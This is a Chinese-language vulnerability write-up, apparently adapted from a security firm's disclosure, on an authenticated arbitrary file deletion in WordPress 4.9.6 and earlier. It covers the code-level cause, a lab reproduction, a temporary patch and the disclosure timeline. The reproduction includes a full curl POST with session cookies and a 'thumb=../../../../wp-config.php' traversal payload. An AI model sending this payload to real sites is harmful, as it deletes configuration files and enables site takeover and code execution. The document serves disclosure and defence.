[https://github.com/SecWiki/CMS-Hunter WARNING: WordPress File Delete to Code Execution](https://blog.ripstech.com/2018/wordpress-file-delete-to-code-execution/)

## 背景介绍

`Wordpress`是世界上最受欢迎的一个CMS，根据资料显示，约有30%的网站在使用它。正是树大招风，它也成为黑客攻击研究的一个有趣目标。在这篇博客中将分析Wordpress核心代码中，一个经过认证的任意文件删除漏洞，该漏洞可能会导致攻击者执行任意代码。7个月之前已经向Wordpress安全团队报告了这个漏洞，到如今仍然没有修复。自从提交之后，没有进行任何的补丁和其他措施，漫长地等待，我们还是决定把这个漏洞公开。

## 受影响的版本

在分析这个漏洞的时候，暂时没有补丁来防御该漏洞。所以通杀全版本，包括当前的4.9.6版本，都容易受到该漏洞的影响。

为了能成功利用这个漏洞，需要有一个小条件。攻击者需要先有一个编辑和删除媒体文件的权限，可能得是其中的一个用户。该漏洞可以通过一个低权限或作者用户来升级到高权限的特权，或者通过其他的漏洞/错误配置。

## 利用方式
利用此漏洞可以使攻击者删除Wordpress安装中任何文件(PHP进程用户在服务器上有权限删除的任何文件)。除了删除整个Wordpress安装文件外，如果没有备份可能会导致严重后果。攻击者可以利用任意文件删除功能绕过一些安全措施并在Web服务器上执行任意代码。更确切的说，可以删除以下文件：

* **.htaccess**  通常，删除此文件不会有任何安全后果。但是，在某些情况下，.htaccess文件包含一些安全相关的约束配置（例如，对某些文件夹的访问限制）。删除此文件将会禁用这些安全限制。
* **index.php**  通常情况下，将空的index.php文件放置到目录中，以防止Web服务器无法执行的情况下，造成目录列表敏感信息泄漏。删除这些文件将为攻击者提供一份列表，列出受此措施保护的目录中的所有文件。
* **wp-config.php**  删除这个WordPress安装文件，会导致在下次访问该网站时，会触发WordPress重新安装过程。这是因为wp-config.php包含数据库凭证，如果没有它，WordPress默认是未安装。攻击者可以删除该文件，使用管理员帐户的凭据进行安装，最后在服务器上执行任意代码。

## 漏洞分析

用户输入的内容没有经过处理，传递给文件删除函数时，造成了任意文件删除漏洞。可谓“一切输入点都是不可信的”。在PHP中，当调用unlink()函数，并且用户输入可能影响部分或这个filename参数时，会发生这种情况。没有进行适当的过滤，会删除该路径的文件。

漏洞代码触发点在`wp-includes/post.php`文件。

![](http://opmi2ydgh.bkt.clouddn.com//18-6-27/91545652.jpg)

 在上面显示的`wp_delete_attachement()`函数中，`$ meta ['thumb']`的内容在未经任何过滤的情况下用于unlink()调用。这段代码的目的是在删除图像的同时删除图像的缩略图。在Wordpress中通过媒体管理器上传的图像被表示为附属类型的帖子。值$ meta ['thumb']从数据库中检索，并保存为表示图像的文章的自定义字段。因此，在从数据库中检索到危险函数调用unlink()之间，表示缩略图文件名的值不会进行任何清理或检查。

如果该值在保存到数据库之前也没有经过任何或其他的安全措施，将在下一段代码中看到这种情况，会造成任意文件删除漏洞。

`/wp-admin/post.php`文件：

![](http://opmi2ydgh.bkt.clouddn.com//18-6-27/81545083.jpg)

在`/wp-admin/post.php`代码中，表示属于附件的缩略图的文件名如何保存到数据库。

在从`$ _POST ['thumb']`参数中的用户输入检索并通过`wp_update_attachment_metadata()`函数保存到数据库之间，没有适当的安全措施来确保该值真正代表正在编辑的附件的缩略图。

`$ _POST ['thumb']`的值可以将任何文件的路径保存到`WordPress`上传目录相对路径中，当附件被删除时，该文件将被删除，如第一列表中所示。

## 漏洞复现

登陆后台，在上传图片处。

![](http://opmi2ydgh.bkt.clouddn.com//18-6-28/38508483.jpg)

![](http://opmi2ydgh.bkt.clouddn.com//18-6-28/94878995.jpg)

然后 edit。

![](http://opmi2ydgh.bkt.clouddn.com//18-6-28/17223918.jpg)

![](http://opmi2ydgh.bkt.clouddn.com//18-6-28/19265580.jpg)

setThumbToConfig('5','15674852ce')

15674852ce

wordpress_545eb34dbe34d45133a1144980b6420a=admin%7C1530557799%7CkcziMOkFc2vgz438WlciwwcHAa0E8vwNaomgS1LQc6y%7C225d0e7e8cd972694c91ac26fed2c53ec66c1c68b1d9ccf569bae2b339c94ce0; wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_545eb34dbe34d45133a1144980b6420a=admin%7C1530557799%7CkcziMOkFc2vgz438WlciwwcHAa0E8vwNaomgS1LQc6y%7Cbc7998bd236a149fec254d82bb97e066750b5af74a1f2336e1689b572a9ec6ac; wp-settings-time-1=1530394704

MacBook-Pro:pen_doc lebor$ curl -v 'http://192.168.2.153/wordpress496/wp-admin/post.php?post=5' -H 'Cookie:wordpress_545eb34dbe34d45133a1144980b6420a=admin%7C1530557799%7CkcziMOkFc2vgz438WlciwwcHAa0E8vwNaomgS1LQc6y%7C225d0e7e8cd972694c91ac26fed2c53ec66c1c68b1d9ccf569bae2b339c94ce0; wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_545eb34dbe34d45133a1144980b6420a=admin%7C1530557799%7CkcziMOkFc2vgz438WlciwwcHAa0E8vwNaomgS1LQc6y%7Cbc7998bd236a149fec254d82bb97e066750b5af74a1f2336e1689b572a9ec6ac; wp-settings-time-1=1530394704' -d 'action=editattachment&_wpnonce=15674852ce&thumb=../../../../wp-config.php'  
*   Trying 192.168.2.153...  
*   TCP_NODELAY set  
*   Connected to 192.168.2.153 (192.168.2.153) port 80 (#0)  
> POST /wordpress496/wp-admin/post.php?post=5 HTTP/1.1  
> Host: 192.168.2.153  
> User-Agent: curl/7.54.0  
> Accept: */*  
> Cookie:wordpress_545eb34dbe34d45133a1144980b6420a=admin%7C1530557799%7CkcziMOkFc2vgz438WlciwwcHAa0E8vwNaomgS1LQc6y%7C225d0e7e8cd972694c91ac26fed2c53ec66c1c68b1d9ccf569bae2b339c94ce0; wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_545eb34dbe34d45133a1144980b6420a=admin%7C1530557799%7CkcziMOkFc2vgz438WlciwwcHAa0E8vwNaomgS1LQc6y%7Cbc7998bd236a149fec254d82bb97e066750b5af74a1f2336e1689b572a9ec6ac; wp-settings-time-1=1530394704  
> Content-Length: 73  
> Content-Type: application/x-www-form-urlencoded  
>
> * upload completely sent off: 73 out of 73 bytes  
>   < HTTP/1.1 302 Found  
>   < Date: Sat, 30 Jun 2018 21:45:23 GMT  
>   < Server: Apache/2.4.23 (Win32) OpenSSL/1.0.2j PHP/5.4.45  
>   < X-Powered-By: PHP/5.4.45  
>   < Expires: Wed, 11 Jan 1984 05:00:00 GMT  
>   < Cache-Control: no-cache, must-revalidate, max-age=0  
>   < X-Frame-Options: SAMEORIGIN  
>   < Referrer-Policy: strict-origin-when-cross-origin  
>   < Location: http://192.168.2.153/wordpress496/wp-admin/post.php?post=5&action=edit&message=4  
>   < Content-Length: 0  
>   < Content-Type: text/html  
>   ​

![](http://opmi2ydgh.bkt.clouddn.com//18-6-28/2843462.jpg)

现在点击Delete Permanently即可。

![](http://opmi2ydgh.bkt.clouddn.com//18-6-28/75307871.jpg)

跳转到安装界面了。

![](http://opmi2ydgh.bkt.clouddn.com//18-6-28/80117267.jpg)

## 暂缓措施

在写此文章的时候，该漏洞还未被修复。以下的代码只是一个临时的修补措施。通过将修补程序添加到当前活动的主题/子主题的functions.php文件中，就是将修补程序集成到现有的WordPress安装代码中，来防御该漏洞。

![](http://opmi2ydgh.bkt.clouddn.com//18-6-27/19731694.jpg)

提供的所有修补程序都会链接到`wp_update_attachement_metadata()`调用中，并确保为元值提供的数据不包含任何涉及到路径遍历的内容，因而不会删除与安全相关的文件。

以上提供的修复方案只是临时的，不能保证兼容Wordpress以后的版本和插件。建议你还是时刻关注Wordpress的修补措施。

## 时间线

* 2017/11/20   在Hackerone 上向Wordpress安全团队提交漏洞报告
* 2017/11/22 这个漏洞被安全团队确认和分类
* 2017/12/12 询问进展情况
* 2017/12/18  Wordpress正在开发一个补丁程序。要求发布日期。没有回复。
* 2018/01/09 要求发布日期。又是没反应。
* 2018/01/20 由于问题太严重了，要求Hackerone进行调解。
* 2018/01/24 WordPress安全团队估计需要6个月的时间才能修复。
* 2018/05/24 询问有关问题的进展/计划，并提醒我们尽快发布。但没有反应。
* 2018/06/26 提交了漏洞7个月，仍未修复漏洞。

## 总结

在这篇博客文章中，我们介绍了WordPress核心代码中中的一个任意文件删除漏洞，它允许任何具有作者权限的用户完全接管WordPress网站并在服务器上执行任意代码。该漏洞去年报告给WordPress安全团队，但在编写本文时仍然没有作任何修补。

为了让大家认识到此漏洞的严重性，我们还是决定发布一些细节和修补程序。使用我们的安全分析报告可以轻松发现并复现该漏洞，我们相信这个问题已经被许多安全研究人员了解。尽管用户帐户的限制条件，可以减少一些网站被受到攻击，但共享多个用户帐户的站点应该应用修补程序。

## 参考

1.[https://w3techs.com/technologies/details/cm-wordpress/all/all](https://w3techs.com/technologies/details/cm-wordpress/all/all)

2.[https://codex.wordpress.org/Custom_Fields](https://codex.wordpress.org/Custom_Fields)

3.[ Wordpress <= 4.9.6 任意文件删除漏洞](http://blog.vulnspy.com/2018/06/27/Wordpress-4-9-6-Arbitrary-File-Delection-Vulnerbility/)


